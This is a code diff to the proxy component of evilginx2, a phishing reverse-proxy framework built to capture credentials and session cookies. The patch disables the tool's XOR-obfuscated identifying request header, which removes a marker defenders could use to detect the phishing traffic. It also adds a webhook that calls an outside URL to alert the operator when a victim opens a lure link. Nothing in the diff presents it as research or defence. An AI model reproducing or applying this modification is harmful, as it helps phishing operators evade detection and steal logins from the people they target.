@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -79,6 +79,22 @@ type ProxySession struct {
 	Created     bool
 	PhishDomain string
 	Index       int
+}
+
+func (p *HttpProxy) NotifyWebhook(url *url.URL) {
+	query := url.Query()
+	if p.cfg.webhookParam == "" {
+		return
+	}
+	if query[p.cfg.webhookParam] == nil {
+		return
+	}
+
+	webhookURL := fmt.Sprintf("%s/?%s=%s", p.cfg.webhookUrl, p.cfg.webhookParam, query[p.cfg.webhookParam][0])
+	_, err := http.Get(webhookURL)
+	if err != nil {
+		log.Error("webhook: %v", err)
+	}
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -159,6 +175,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return p.blockRequest(req)
 			}
 
+			p.NotifyWebhook(req.URL)
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			lure_url := req_url
 			req_path := req.URL.Path
@@ -180,7 +197,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
+				//egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -347,7 +364,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
+				//hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -374,9 +391,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
+				//for n, b := range hg {
+				//hg[n] = b ^ 0xCC}
+
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -404,7 +421,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
+				//req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -559,11 +576,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
-				for n, b := range e {
-					e[n] = b ^ 0x88
-				}
-				req.Header.Set(string(e), e_host)
+				//e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				//for n, b := range e {
+				//	e[n] = b ^ 0x88
+				//}
+				//req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -577,7 +594,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				p.cantFindMe(req, e_host)
+				//p.cantFindMe(req, e_host)
 			}
 
 			return req, nil
@@ -1453,13 +1470,13 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
-func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
-	var b []byte = []byte("\x1dh\x003,)\",+=")
-	for n, c := range b {
-		b[n] = c ^ 0x45
-	}
-	req.Header.Set(string(b), nothing_to_see_here)
-}
+//func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
+//var b []byte = []byte("\x1dh\x003,)\",+=")
+//for n, c := range b {
+//	b[n] = c ^ 0x45
+//}
+//req.Header.Set(string(b), nothing_to_see_here)
+//}
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
